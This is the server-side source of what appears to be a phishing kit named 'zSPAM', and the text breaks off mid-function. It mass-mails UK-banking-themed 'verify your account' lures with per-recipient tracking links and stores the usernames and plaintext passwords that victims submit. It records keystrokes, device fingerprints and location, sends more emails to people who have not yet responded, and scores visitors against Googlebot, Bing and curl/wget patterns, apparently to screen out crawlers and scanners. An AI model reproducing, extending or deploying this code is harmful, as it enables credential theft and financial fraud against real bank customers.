import { db } from '../db';
import { alertSettings } from '@shared/schema';
import { eq } from 'drizzle-orm';

interface AlertData {
  title: string;
  message: string;
  type: 'info' | 'success' | 'warning' | 'error';
  campaignId?: string;
  sessionId?: string;
  userId?: string;
  metadata?: Record<string, any>;
}

interface CampaignStats {
  totalRecipients: number;
  sentCount: number;
  failedCount: number;
}

export class AlertService {
  // Send credential capture alert
  async sendCredentialCaptureAlert(session: any, campaign: any) {
    const alertData: AlertData = {
      title: 'ðŸ”´ Credentials Captured',
      message: `New credentials captured in campaign "${campaign.name}"`,
      type: 'warning',
      campaignId: campaign.id,
      sessionId: session.id,
      metadata: {
        username: session.username,
        ipAddress: session.ipAddress,
        userAgent: session.userAgent,
        campaignType: campaign.type,
        captureTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send campaign start alert
  async sendCampaignStartAlert(campaign: any, stats: CampaignStats) {
    const alertData: AlertData = {
      title: 'ðŸš€ Campaign Started',
      message: `Campaign "${campaign.name}" has been launched successfully`,
      type: 'success',
      campaignId: campaign.id,
      metadata: {
        campaignType: campaign.type,
        totalRecipients: stats.totalRecipients,
        sentCount: stats.sentCount,
        failedCount: stats.failedCount,
        successRate: ((stats.sentCount / stats.totalRecipients) * 100).toFixed(1) + '%',
        startTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send campaign end alert
  async sendCampaignEndAlert(campaign: any, finalStats: any) {
    const alertData: AlertData = {
      title: 'ðŸ“Š Campaign Completed',
      message: `Campaign "${campaign.name}" has completed`,
      type: 'info',
      campaignId: campaign.id,
      metadata: {
        campaignType: campaign.type,
        duration: this.calculateDuration(campaign.createdAt, new Date()),
        totalRecipients: finalStats.totalRecipients,
        emailsOpened: finalStats.emailsOpened,
        linksClicked: finalStats.linksClicked,
        credentialsSubmitted: finalStats.credentialsSubmitted,
        clickRate: ((finalStats.linksClicked / finalStats.totalRecipients) * 100).toFixed(1) + '%',
        submissionRate: ((finalStats.credentialsSubmitted / finalStats.totalRecipients) * 100).toFixed(1) + '%',
        endTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send high-risk session alert
  async sendHighRiskSessionAlert(session: any, campaign: any) {
    const alertData: AlertData = {
      title: 'âš ï¸ High-Risk Session Detected',
      message: `Suspicious activity detected in campaign "${campaign.name}"`,
      type: 'warning',
      campaignId: campaign.id,
      sessionId: session.id,
      metadata: {
        riskLevel: session.riskLevel,
        botScore: session.botScore,
        humanScore: session.humanScore,
        suspiciousFactors: this.analyzeSuspiciousFactors(session),
        ipAddress: session.ipAddress,
        userAgent: session.userAgent,
        detectionTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Main alert sending function
  private async sendAlert(userId: string, alertData: AlertData) {
    try {
      // Get user's alert settings
      const userAlerts = await db.select()
        .from(alertSettings)
        .where(eq(alertSettings.userId, userId))
        .limit(1);

      if (!userAlerts.length) {
        // Create default alert settings if none exist
        await this.createDefaultAlertSettings(userId);
        return;
      }

      const settings = userAlerts[0];

      // Send alerts based on user preferences
      const promises: Promise<any>[] = [];

      if (settings.emailEnabled && settings.emailAddress) {
        promises.push(this.sendEmailAlert(settings.emailAddress, alertData));
      }

      if (settings.slackEnabled && settings.slackWebhookUrl) {
        promises.push(this.sendSlackAlert(settings.slackWebhookUrl, settings.slackChannel, alertData));
      }

      if (settings.telegramEnabled && settings.telegramBotToken && settings.telegramChatId) {
        promises.push(this.sendTelegramAlert(
          settings.telegramBotToken,
          settings.telegramChatId,
          alertData
        ));
      }

      if (settings.webhookEnabled && settings.webhookUrl) {
        promises.push(this.sendWebhookAlert(settings.webhookUrl, settings.webhookSecret, alertData));
      }

      // Execute all alerts concurrently
      await Promise.allSettled(promises);
    } catch (error) {
      console.error('Failed to send alert:', error);
    }
  }

  // Send email alert
  private async sendEmailAlert(emailAddress: string, alertData: AlertData) {
    try {
      // Import email sending functionality
      const { sendEmail } = await import('./emailSender');

      const subject = `zSPAM Alert: ${alertData.title}`;
      const htmlContent = this.generateEmailAlertContent(alertData);

      await sendEmail({
        to: emailAddress,
        subject,
        html: htmlContent,
        text: this.stripHtml(htmlContent)
      });
    } catch (error) {
      console.error('Failed to send email alert:', error);
    }
  }

  // Send Slack alert
  private async sendSlackAlert(webhookUrl: string, channel: string | null, alertData: AlertData) {
    try {
      const payload = {
        channel: channel || '#general',
        username: 'zSPAM Bot',
        icon_emoji: this.getSlackEmoji(alertData.type),
        attachments: [{
          color: this.getSlackColor(alertData.type),
          title: alertData.title,
          text: alertData.message,
          fields: this.formatMetadataForSlack(alertData.metadata),
          timestamp: Math.floor(Date.now() / 1000)
        }]
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Slack webhook failed: ${response.statusText}`);
      }
    } catch (error) {
      console.error('Failed to send Slack alert:', error);
    }
  }

  // Send Telegram alert
  private async sendTelegramAlert(botToken: string, chatId: string, alertData: AlertData) {
    try {
      const message = this.formatTelegramMessage(alertData);

      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram API error: ${error.description}`);
      }
    } catch (error) {
      console.error('Failed to send Telegram alert:', error);
    }
  }

  // Send webhook alert
  private async sendWebhookAlert(webhookUrl: string, webhookSecret: string | null, alertData: AlertData) {
    try {
      const payload = {
        timestamp: new Date().toISOString(),
        event: alertData.type,
        data: alertData
      };

      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
        'X-zSPAM-Event': alertData.type
      };

      // Add signature if secret is provided
      if (webhookSecret) {
        const crypto = require('crypto');
        const signature = crypto
          .createHmac('sha256', webhookSecret)
          .update(JSON.stringify(payload))
          .digest('hex');
        headers['X-zSPAM-Signature'] = `sha256=${signature}`;
      }

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Webhook failed: ${response.statusText}`);
      }
    } catch (error) {
      console.error('Failed to send webhook alert:', error);
    }
  }

  // Create default alert settings for new users
  private async createDefaultAlertSettings(userId: string) {
    await db.insert(alertSettings).values({
      userId,
      emailEnabled: true,
      alertOnCredentialCapture: true,
      alertOnCampaignStart: true,
      alertOnCampaignEnd: true,
      alertOnHighRiskSession: true
    });
  }

  // Helper functions
  private calculateDuration(startTime: Date, endTime: Date): string {
    const diff = endTime.getTime() - startTime.getTime();
    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    return `${hours}h ${minutes}m`;
  }

  private analyzeSuspiciousFactors(session: any): string[] {
    const factors: string[] = [];

    if (session.botScore > 70) factors.push('High bot score');
    if (session.humanScore < 30) factors.push('Low human score');
    if (!session.userAgent) factors.push('Missing user agent');
    if (session.timeOnPage < 5) factors.push('Suspiciously fast interaction');

    return factors;
  }

  private generateEmailAlertContent(alertData: AlertData): string {
    return `
      <html>
        <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
          <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
            <div style="background: ${this.getEmailColor(alertData.type)}; color: white; padding: 20px; border-radius: 8px 8px 0 0;">
              <h1 style="margin: 0; font-size: 24px;">${alertData.title}</h1>
            </div>
            <div style="background: #f9f9f9; padding: 20px; border-radius: 0 0 8px 8px; border: 1px solid #ddd;">
              <p style="font-size: 16px; margin-bottom: 20px;">${alertData.message}</p>

              ${alertData.metadata ? `
                <h3>Details:</h3>
                <ul style="list-style: none; padding: 0;">
                  ${Object.entries(alertData.metadata).map(([key, value]) => 
                    `<li style="margin-bottom: 8px;"><strong>${this.formatKey(key)}:</strong> ${value}</li>`
                  ).join('')}
                </ul>
              ` : ''}

              <p style="margin-top: 30px; font-size: 14px; color: #666;">
                This alert was generated by zSPAM at ${new Date().toLocaleString()}
              </p>
            </div>
          </div>
        </body>
      </html>
    `;
  }

  private formatTelegramMessage(alertData: AlertData): string {
    let message = `*${alertData.title}*\n\n${alertData.message}\n`;

    if (alertData.metadata) {
      message += '\n*Details:*\n';
      for (const [key, value] of Object.entries(alertData.metadata)) {
        message += `â€¢ *${this.formatKey(key)}:* ${value}\n`;
      }
    }

    message += `\n_Alert generated at ${new Date().toLocaleString()}_`;
    return message;
  }

  private formatMetadataForSlack(metadata?: Record<string, any>) {
    if (!metadata) return [];

    return Object.entries(metadata).map(([key, value]) => ({
      title: this.formatKey(key),
      value: String(value),
      short: true
    }));
  }

  private formatKey(key: string): string {
    return key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
  }

  private getSlackEmoji(type: string): string {
    const emojis = {
      info: ':information_source:',
      success: ':white_check_mark:',
      warning: ':warning:',
      error: ':x:'
    };
    return emojis[type as keyof typeof emojis] || ':bell:';
  }

  private getSlackColor(type: string): string {
    const colors = {
      info: '#36a64f',
      success: '#2eb886',
      warning: '#ff9500',
      error: '#e01e5a'
    };
    return colors[type as keyof typeof colors] || '#cccccc';
  }

  private getEmailColor(type: string): string {
    const colors = {
      info: '#3498db',
      success: '#2ecc71',
      warning: '#f39c12',
      error: '#e74c3c'
    };
    return colors[type as keyof typeof colors] || '#95a5a6';
  }

  private stripHtml(html: string): string {
    return html.replace(/<[^>]*>/g, '').replace(/&nbsp;/g, ' ');
  }
}

// Export singleton instance
export const alertService = new AlertService();

server/services/emailAutomation.ts.content:
import { db } from '../db';
import { campaigns, recipients, campaignSchedules, followUpCampaigns } from '@shared/schema';
import { eq, and, lte, isNull } from 'drizzle-orm';
import { sendEmail } from './emailSender';
import { alertService } from './alertService';

export class EmailAutomationService {
  private isRunning = false;
  private intervalId: NodeJS.Timeout | null = null;

  // Start the automation service
  start() {
    if (this.isRunning) return;

    this.isRunning = true;
    // Check for scheduled campaigns every minute
    this.intervalId = setInterval(() => {
      this.processScheduledCampaigns();
      this.processFollowUpEmails();
    }, 60000); // 1 minute

    console.log('Email automation service started');
  }

  // Stop the automation service
  stop() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    this.isRunning = false;
    console.log('Email automation service stopped');
  }

  // Process scheduled campaigns that are ready to launch
  private async processScheduledCampaigns() {
    try {
      const now = new Date();

      // Find scheduled campaigns ready to launch
      const scheduledCampaigns = await db.select()
        .from(campaignSchedules)
        .leftJoin(campaigns, eq(campaignSchedules.campaignId, campaigns.id))
        .where(and(
          lte(campaignSchedules.scheduledAt, now),
          isNull(campaignSchedules.executedAt),
          eq(campaignSchedules.status, 'pending')
        ));

      for (const schedule of scheduledCampaigns) {
        if (!schedule.campaigns) continue;

        await this.executeCampaign(schedule.campaign_schedules, schedule.campaigns);
      }
    } catch (error) {
      console.error('Error processing scheduled campaigns:', error);
    }
  }

  // Execute a scheduled campaign
  private async executeCampaign(schedule: any, campaign: any) {
    try {
      // Mark schedule as executing
      await db.update(campaignSchedules)
        .set({
          status: 'executing',
          executedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));

      // Get campaign recipients
      const campaignRecipients = await db.select()
        .from(recipients)
        .where(eq(recipients.campaignId, campaign.id));

      const totalRecipients = campaignRecipients.length;
      let sentCount = 0;
      let failedCount = 0;

      // Send emails in batches
      const batchSize = schedule.batchSize || 50;
      const delayBetweenBatches = (schedule.delayBetweenBatches || 5) * 60 * 1000; // Convert to milliseconds

      for (let i = 0; i < campaignRecipients.length; i += batchSize) {
        const batch = campaignRecipients.slice(i, i + batchSize);

        for (const recipient of batch) {
          try {
            await this.sendCampaignEmail(campaign, recipient);
            sentCount++;

            // Update recipient status
            await db.update(recipients)
              .set({
                status: 'sent',
                sentAt: new Date(),
                updatedAt: new Date()
              })
              .where(eq(recipients.id, recipient.id));

            // Add delay between individual emails
            if (campaign.delayMs && campaign.delayMs > 0) {
              await new Promise(resolve => setTimeout(resolve, campaign.delayMs));
            }
          } catch (error) {
            failedCount++;
            console.error(`Failed to send email to ${recipient.email}:`, error);

            // Update recipient with failed status
            await db.update(recipients)
              .set({
                status: 'failed',
                updatedAt: new Date()
              })
              .where(eq(recipients.id, recipient.id));
          }
        }

        // Delay between batches (except for last batch)
        if (i + batchSize < campaignRecipients.length) {
          await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
        }
      }

      // Mark campaign as active
      await db.update(campaigns)
        .set({
          status: 'active',
          updatedAt: new Date()
        })
        .where(eq(campaigns.id, campaign.id));

      // Update schedule with results
      await db.update(campaignSchedules)
        .set({
          status: 'completed',
          totalRecipients,
          sentCount,
          failedCount,
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));

      // Send alert notification
      await alertService.sendCampaignStartAlert(campaign, {
        totalRecipients,
        sentCount,
        failedCount
      });

      console.log(`Campaign ${campaign.name} executed: ${sentCount}/${totalRecipients} emails sent`);
    } catch (error) {
      console.error(`Failed to execute campaign ${campaign.name}:`, error);

      // Mark schedule as failed
      await db.update(campaignSchedules)
        .set({
          status: 'failed',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));
    }
  }

  // Send campaign email to recipient
  private async sendCampaignEmail(campaign: any, recipient: any) {
    const campaignUrl = this.generateCampaignUrl(campaign, recipient);

    // Get email template or use default
    const emailTemplate = await this.getEmailTemplate(campaign.type);

    // Replace placeholders in template
    const personalizedContent = this.personalizeContent(emailTemplate, recipient, campaignUrl);

    // Send the email
    await sendEmail({
      to: recipient.email,
      subject: personalizedContent.subject,
      html: personalizedContent.html,
      text: personalizedContent.text
    });
  }

  // Generate campaign URL with tracking parameters
  private generateCampaignUrl(campaign: any, recipient: any): string {
    const baseUrl = process.env.BASE_URL || 'http://localhost:5000';
    const campaignPath = campaign.customPath || `/${campaign.type}`;

    // Add tracking parameters
    const params = new URLSearchParams({
      cid: campaign.id,
      rid: recipient.id,
      t: Date.now().toString()
    });

    return `${baseUrl}${campaignPath}?${params}`;
  }

  // Get email template based on campaign type
  private async getEmailTemplate(campaignType: string) {
    // Import UK banking templates
    const ukBankingTemplates = await import('../../client/src/components/email-templates/uk-banking');

    const templates = ukBankingTemplates.ukBankingTemplates;

    return templates[campaignType as keyof typeof templates] || {
      subject: 'Security Alert - Action Required',
      htmlContent: '<p>Please verify your account: <a href="{{CAMPAIGN_URL}}">Click here</a></p>',
      textContent: 'Please verify your account: {{CAMPAIGN_URL}}'
    };
  }

  // Personalize email content with recipient data
  private personalizeContent(template: any, recipient: any, campaignUrl: string) {
    const replacements = {
      '{{CAMPAIGN_URL}}': campaignUrl,
      '{{FIRST_NAME}}': recipient.firstName || recipient.name || 'Valued Customer',
      '{{LAST_NAME}}': recipient.lastName || '',
      '{{FULL_NAME}}': recipient.name || `${recipient.firstName || ''} ${recipient.lastName || ''}`.trim(),
      '{{COMPANY}}': recipient.company || 'your organization',
      '{{EMAIL}}': recipient.email
    };

    let subject = template.subject;
    let htmlContent = template.htmlContent;
    let textContent = template.textContent;

    // Replace all placeholders
    for (const [placeholder, value] of Object.entries(replacements)) {
      subject = subject.replace(new RegExp(placeholder, 'g'), value);
      htmlContent = htmlContent.replace(new RegExp(placeholder, 'g'), value);
      textContent = textContent.replace(new RegExp(placeholder, 'g'), value);
    }

    return {
      subject,
      html: htmlContent,
      text: textContent
    };
  }

  // Process follow-up emails for non-responders
  private async processFollowUpEmails() {
    try {
      const now = new Date();

      // Find follow-up campaigns ready to send
      const dueFollowUps = await db.select()
        .from(followUpCampaigns)
        .leftJoin(campaigns, eq(followUpCampaigns.parentCampaignId, campaigns.id))
        .leftJoin(recipients, eq(followUpCampaigns.recipientId, recipients.id))
        .where(and(
          lte(followUpCampaigns.scheduledAt, now),
          isNull(followUpCampaigns.executedAt),
          eq(followUpCampaigns.status, 'pending')
        ));

      for (const followUp of dueFollowUps) {
        if (!followUp.campaigns || !followUp.recipients) continue;

        await this.sendFollowUpEmail(followUp);
      }
    } catch (error) {
      console.error('Error processing follow-up emails:', error);
    }
  }

  // Send a follow-up email
  private async sendFollowUpEmail(followUp: any) {
    try {
      const campaign = followUp.campaigns;
      const recipient = followUp.recipients;
      const followUpData = followUp.follow_up_campaigns;

      // Check if recipient hasn't responded yet
      if (recipient.status === 'submitted') {
        // Don't send follow-up if they've already submitted credentials
        await db.update(followUpCampaigns)
          .set({
            status: 'cancelled',
            response: 'Recipient already responded',
            updatedAt: new Date()
          })
          .where(eq(followUpCampaigns.id, followUpData.id));
        return;
      }

      // Send follow-up email
      await this.sendCampaignEmail(campaign, recipient);

      // Update follow-up status
      await db.update(followUpCampaigns)
        .set({
          status: 'sent',
          executedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(followUpCampaigns.id, followUpData.id));

      // Update recipient follow-up count
      await db.update(recipients)
        .set({
          followUpCount: (recipient.followUpCount || 0) + 1,
          lastFollowUpAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(recipients.id, recipient.id));

      console.log(`Follow-up email sent to ${recipient.email} for campaign ${campaign.name}`);
    } catch (error) {
      console.error('Failed to send follow-up email:', error);

      // Mark follow-up as failed
      await db.update(followUpCampaigns)
        .set({
          status: 'failed',
          response: error instanceof Error ? error.message : 'Unknown error',
          updatedAt: new Date()
        })
        .where(eq(followUpCampaigns.id, followUp.follow_up_campaigns.id));
    }
  }

  // Schedule a campaign for later execution
  async scheduleCampaign(campaignId: string, scheduledAt: Date, options: {
    batchSize?: number;
    delayBetweenBatches?: number;
  } = {}) {
    const totalRecipients = await db.select()
      .from(recipients)
      .where(eq(recipients.campaignId, campaignId));

    await db.insert(campaignSchedules).values({
      campaignId,
      scheduledAt,
      batchSize: options.batchSize || 50,
      delayBetweenBatches: options.delayBetweenBatches || 5,
      totalRecipients: totalRecipients.length,
      status: 'pending'
    });

    // Update campaign status
    await db.update(campaigns)
      .set({
        status: 'scheduled',
        scheduledAt,
        updatedAt: new Date()
      })
      .where(eq(campaigns.id, campaignId));
  }

  // Schedule follow-up emails for non-responders
  async scheduleFollowUps(campaignId: string) {
    const campaign = await db.select()
      .from(campaigns)
      .where(eq(campaigns.id, campaignId))
      .limit(1);

    if (!campaign[0] || !campaign[0].followUpEnabled) return;

    const campaignData = campaign[0];
    const followUpDelayHours = campaignData.followUpDelayHours || 24;
    const maxFollowUps = campaignData.maxFollowUps || 2;

    // Get recipients who haven't responded
    const nonResponders = await db.select()
      .from(recipients)
      .where(and(
        eq(recipients.campaignId, campaignId),
        eq(recipients.status, 'sent') // Only sent, not clicked or submitted
      ));

    for (const recipient of nonResponders) {
      for (let i = 1; i <= maxFollowUps; i++) {
        const scheduledAt = new Date();
        scheduledAt.setHours(scheduledAt.getHours() + (followUpDelayHours * i));

        await db.insert(followUpCampaigns).values({
          parentCampaignId: campaignId,
          recipientId: recipient.id,
          followUpType: 'email',
          scheduledAt,
          content: `Follow-up #${i} for ${campaignData.name}`,
          status: 'pending'
        });
      }
    }
  }
}

// Export singleton instance
export const emailAutomationService = new EmailAutomationService();

server/services/emailSender.ts.content:
import { db } from '../db';
import { smtpServers } from '@shared/schema';
import { eq } from 'drizzle-orm';
import nodemailer from 'nodemailer';

interface EmailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  from?: string;
  attachments?: any[];
}

// Send email using configured SMTP server
export async function sendEmail(options: EmailOptions): Promise<void> {
  try {
    // Get active SMTP server
    const activeServers = await db.select()
      .from(smtpServers)
      .where(eq(smtpServers.isActive, true))
      .limit(1);

    if (!activeServers.length) {
      throw new Error('No active SMTP server configured');
    }

    const smtp = activeServers[0];

    // Create transporter
    const transporter = nodemailer.createTransporter({
      host: smtp.host,
      port: smtp.port,
      secure: smtp.secure,
      auth: {
        user: smtp.username,
        pass: smtp.password
      }
    });

    // Send email
    await transporter.sendMail({
      from: options.from || smtp.username,
      to: options.to,
      subject: options.subject,
      html: options.html,
      text: options.text,
      attachments: options.attachments
    });

  } catch (error) {
    console.error('Failed to send email:', error);
    throw error;
  }
}

server/services/sessionAnalytics.ts.content:
import { db } from '../db';
import { sessions, campaignAnalytics } from '@shared/schema';
import { eq, and, gte, lte, sql } from 'drizzle-orm';
import UAParser from 'ua-parser-js';
import geoip from 'geoip-lite';

interface SessionData {
  campaignId: string;
  ipAddress: string;
  userAgent: string;
  username?: string;
  password?: string;
  additionalData?: Record<string, any>;
}

interface DeviceFingerprint {
  screenResolution: string;
  colorDepth: number;
  timezone: string;
  language: string;
  plugins: string[];
  fonts: string[];
  canvas: string;
  webgl: string;
}

interface InteractionData {
  mouseMovements: Array<{ x: number; y: number; timestamp: number }>;
  keystrokes: Array<{ key: string; timestamp: number }>;
  scrollBehavior: Array<{ position: number; timestamp: number }>;
  clickEvents: Array<{ x: number; y: number; element: string; timestamp: number }>;
}

export class SessionAnalyticsService {
  // Create enhanced session with analytics
  async createSession(sessionData: SessionData, deviceFingerprint?: DeviceFingerprint, interactionData?: InteractionData) {
    try {
      // Parse user agent
      const parser = new UAParser(sessionData.userAgent);
      const device = parser.getDevice();
      const browser = parser.getBrowser();
      const os = parser.getOS();

      // Get geolocation from IP
      const geo = geoip.lookup(sessionData.ipAddress);

      // Calculate bot detection scores
      const botAnalysis = this.analyzeBotBehavior(sessionData, deviceFingerprint, interactionData);

      // Create session record
      const session = await db.insert(sessions).values({
        campaignId: sessionData.campaignId,
        ipAddress: sessionData.ipAddress,
        userAgent: sessionData.userAgent,
        username: sessionData.username,
        password: sessionData.password,
        status: botAnalysis.isBot ? 'bot_detected' : 'pending',

        // Device information
        deviceType: this.getDeviceType(device),
        operatingSystem: os.name || 'Unknown',
        browser: browser.name || 'Unknown',
        browserVersion: browser.version || 'Unknown',
        screenResolution: deviceFingerprint?.screenResolution || 'Unknown',
        timezone: deviceFingerprint?.timezone || 'Unknown',
        language: deviceFingerprint?.language || 'Unknown',

        // Geolocation
        geolocation: geo ? {
          country: geo.country,
          region: geo.region,
          city: geo.city,
          latitude: geo.ll[0],
          longitude: geo.ll[1],
          timezone: geo.timezone
        } : null,

        // Device fingerprint
        deviceFingerprint: deviceFingerprint ? {
          screenResolution: deviceFingerprint.screenResolution,
          colorDepth: deviceFingerprint.colorDepth,
          timezone: deviceFingerprint.timezone,
          language: deviceFingerprint.language,
          plugins: deviceFingerprint.plugins,
          fonts: deviceFingerprint.fonts,
          canvas: deviceFingerprint.canvas,
          webgl: deviceFingerprint.webgl
        } : null,

        // Interaction tracking
        mouseMovements: interactionData?.mouseMovements || null,
        keystrokes: interactionData?.keystrokes || null,
        scrollBehavior: interactionData?.scrollBehavior || null,

        // Bot detection scores
        botScore: botAnalysis.botScore,
        humanScore: botAnalysis.humanScore,
        riskLevel: botAnalysis.riskLevel,

        additionalData: sessionData.additionalData,
        createdAt: new Date(),
        updatedAt: new Date()
      }).returning();

      // Update daily analytics
      await this.updateDailyAnalytics(sessionData.campaignId, session[0]);

      return session[0];
    } catch (error) {
      console.error('Failed to create session:', error);
      throw error;
    }
  }

  // Update session with completion data
  async updateSessionCompletion(sessionId: string, completionData: {
    status: 'complete' | 'failed';
    completionPercentage: number;
    timeOnPage: number;
    additionalData?: Record<string, any>;
  }) {
    try {
      await db.update(sessions)
        .set({
          status: completionData.status,
          completionPercentage: completionData.completionPercentage,
          timeOnPage: completionData.timeOnPage,
          additionalData: completionData.additionalData,
          completedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(sessions.id, sessionId));

      // Update campaign analytics
      await this.updateCampaignMetrics(sessionId);
    } catch (error) {
      console.error('Failed to update session completion:', error);
      throw error;
    }
  }

  // Analyze bot behavior patterns
  private analyzeBotBehavior(sessionData: SessionData, deviceFingerprint?: DeviceFingerprint, interactionData?: InteractionData) {
    let botScore = 0;
    const factors: string[] = [];

    // User agent analysis
    if (!sessionData.userAgent) {
      botScore += 30;
      factors.push('Missing user agent');
    } else if (this.isSuspiciousUserAgent(sessionData.userAgent)) {
      botScore += 20;
      factors.push('Suspicious user agent');
    }

    // Device fingerprint analysis
    if (!deviceFingerprint) {
      botScore += 15;
      factors.push('Missing device fingerprint');
    } else {
      // Check for common bot patterns
      if (deviceFingerprint.plugins.length === 0) {
        botScore += 10;
        factors.push('No browser plugins');
      }
      if (deviceFingerprint.fonts.length < 10) {
        botScore += 10;
        factors.push('Limited font list');
      }
    }

    // Interaction analysis
    if (!interactionData) {
      botScore += 25;
      factors.push('No interaction data');
    } else {
      // Mouse movement patterns
      if (interactionData.mouseMovements.length < 5) {
        botScore += 15;
        factors.push('Limited mouse movement');
      }

      // Keyboard patterns
      if (interactionData.keystrokes.length === 0) {
        botScore += 10;
        factors.push('No keyboard interaction');
      }

      // Speed analysis
      const totalTime = this.calculateInteractionTime(interactionData);
      if (totalTime < 2000) { // Less than 2 seconds
        botScore += 20;
        factors.push('Suspiciously fast interaction');
      }
    }

    // IP analysis
    if (this.isKnownBotIP(sessionData.ipAddress)) {
      botScore += 25;
      factors.push('Known bot IP');
    }

    const humanScore = Math.max(0, 100 - botScore);
    const riskLevel = botScore > 70 ? 'high' : botScore > 40 ? 'medium' : 'low';

    return {
      botScore: Math.min(100, botScore),
      humanScore,
      riskLevel,
      isBot: botScore > 60,
      factors
    };
  }

  // Check if user agent is suspicious
  private isSuspiciousUserAgent(userAgent: string): boolean {
    const suspiciousPatterns = [
      /bot/i,
      /crawler/i,
      /spider/i,
      /scraper/i,
      /python/i,
      /curl/i,
      /wget/i,
      /headless/i
    ];

    return suspiciousPatterns.some(pattern => pattern.test(userAgent));
  }

  // Check if IP is known bot IP
  private isKnownBotIP(ipAddress: string): boolean {
    // Common bot IP ranges (simplified - in production, use a comprehensive database)
    const botRanges = [
      /^66\.249\./, // Google Bot
      /^40\.77\./,  // Bing Bot
      /^157\.55\./, // Bing Bot
    ];

    return botRanges.some(range => range.test(ipAddress));
  }

  // Calculate total interaction time
  private calculateInteractionTime(interactionData: InteractionData): number {
    const timestamps: number[] = [];

    timestamps.push(...interactionData.mouseMovements.map(m => m.timestamp));
    timestamps.push(...interactionData.keystrokes.map(k => k.timestamp));
    timestamps.push(...interactionData.scrollBehavior.map(s => s.timestamp));

    if (timestamps.length < 2) return 0;

    return Math.max(...timestamps) - Math.min(...timestamps);
  }

  // Determine device type
  private getDeviceType(device: any): string {
    if (device.type === 'mobile') return 'mobile';
    if (device.type === 'tablet') return 'tablet';
    return 'desktop';
  }

  // Update daily analytics
  private async updateDailyAnalytics(campaignId: string, session: any) {
    try {
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      // Check if analytics record exists for today
      const existingAnalytics = await db.select()
        .from(campaignAnalytics)
        .where(and(
          eq(campaignAnalytics.campaignId, campaignId),
          eq(campaignAnalytics.date, today)
        ))
        .limit(1);

      const deviceIncrement = {
        desktopVisits: session.deviceType === 'desktop' ? 1 : 0,
        mobileVisits: session.deviceType === 'mobile' ? 1 : 0,
        tabletVisits: session.deviceType === 'tablet' ? 1 : 0
      };

      const securityIncrement = {
        botDetections: session.status === 'bot_detected' ? 1 : 0,
        suspiciousActivities: session.riskLevel === 'high' ? 1 : 0
      };

      if (existingAnalytics.length) {
        // Update existing record
        await db.update(campaignAnalytics)
          .set({
            uniqueVisitors: sql`${campaignAnalytics.uniqueVisitors} + 1`,
            desktopVisits: sql`${campaignAnalytics.desktopVisits} + ${deviceIncrement.desktopVisits}`,
            mobileVisits: sql`${campaignAnalytics.mobileVisits} + ${deviceIncrement.mobileVisits}`,
            tabletVisits: sql`${campaignAnalytics.tabletVisits} + ${deviceIncrement.tabletVisits}`,
            botDetections: sql`${campaignAnalytics.botDetections} + ${securityIncrement.botDetections}`,
            suspiciousActivities: sql`${campaignAnalytics.suspiciousActivities} + ${securityIncrement.suspiciousActivities}`
          })
          .where(eq(campaignAnalytics.id, existingAnalytics[0].id));
      } else {
        // Create new record
        await db.insert(campaignAnalytics).values({
          campaignId,
          date: today,
          uniqueVisitors: 1,
          ...deviceIncrement,
          ...securityIncrement,
          topCountries: session.geolocation ? [session.geolocation.country] : [],
          topCities: session.geolocation ? [session.geolocation.city] : []
        });
      }
    } catch (error) {
      console.error('Failed to update daily analytics:', error);
    }
  }

  // Update campaign metrics after session completion
  private async updateCampaignMetrics(sessionId: string) {
    try {
      const session = await db.select()
        .from(sessions)
        .where(eq(sessions.id, sessionId))
        .limit(1);

      if (!session.length) return;

      const sessionData = session[0];
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      if (sessionData.status === 'complete') {
        await db.update(campaignAnalytics)
          .set({
            credentialsSubmitted: sql`${campaignAnalytics.credentialsSubmitted} + 1`
          })
          .where(and(
            eq(campaignAnalytics.campaignId, sessionData.campaignId!),
            eq(campaignAnalytics.date, today)
          ));
      }
    } catch (error) {
      console.error('Failed to update campaign metrics:', error);
    }
  }

  // Get analytics for a campaign
  async getCampaignAnalytics(campaignId: string, startDate?: Date, endDate?: Date) {
    try {
      const conditions = [eq(campaignAnalytics.campaignId, campaignId)];

      if (startDate) {
        conditions.push(gte(campaignAnalytics.date, startDate));
      }

      if (endDate) {
        conditions.push(lte(campaignAnalytics.date, endDate));
      }

      const analytics = await db.select()
        .from(campaignAnalytics)
        .where(and(...conditions))
        .orderBy(campaignAnalytics.date);

      return analytics;
    } catch (error) {
      console.error('Failed to get campaign analytics:', error);
      return [];
    }
  }

  // Get session details with analytics
  async getSessionDetails(sessionId: string) {
    try {
      const session = await db.select()
        .from(sessions)
        .where(eq(sessions.id, sessionId))
        .limit(1);

